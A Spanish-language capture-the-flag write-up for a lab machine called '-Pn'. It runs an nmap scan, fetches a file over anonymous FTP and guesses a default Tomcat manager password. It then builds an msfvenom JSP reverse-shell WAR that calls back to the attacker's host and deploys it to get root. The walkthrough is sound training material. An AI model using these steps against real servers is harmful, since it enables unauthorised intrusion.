# MÁQUINA -Pn

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/-Pn/foto.jpg)

Vemos que están abiertos tanto el puerto 8080 como el 21. En este último podemos loggearnos como anonymous y coger el contenido de ese fichero tomcat.txt:

![FTP](https://github.com/Isma-yo/photos/blob/main/-Pn/foto2.jpg)

Si hacemos un cat del archivo vemos que solo nos da un posible usuario tomcat, nada más en especial, asi que ahora vamos a mirar el contenido del puerto 8080:

![WEB](https://github.com/Isma-yo/photos/blob/main/-Pn/foto3.jpg)

Vemos que es una página de tomcat. Tenemos un usuario tomcat, así que vamos a buscar cuáles son las contraseñas por defecto o más usadas en tomcat:

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

Después de ir probando, damos con la contraseña del usuario tomcat, s3cr3t. Así que vamos a accder al panel de administración:

![IN](https://github.com/Isma-yo/photos/blob/main/-Pn/foto4.jpg)

Vemos que hay una opción para subir archivos de tipo WAR, podemos intentar subirnos una reverse shell. Para generarla podemos utilizar msfvenom:

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o shell.war
```

Subimos el archivo, vemos que se ha subido, antes de pinchar encima de el nos ponemos a la escucha y...:

![ROOT](https://github.com/Isma-yo/photos/blob/main/-Pn/foto5.jpg)

Y ya somos root!






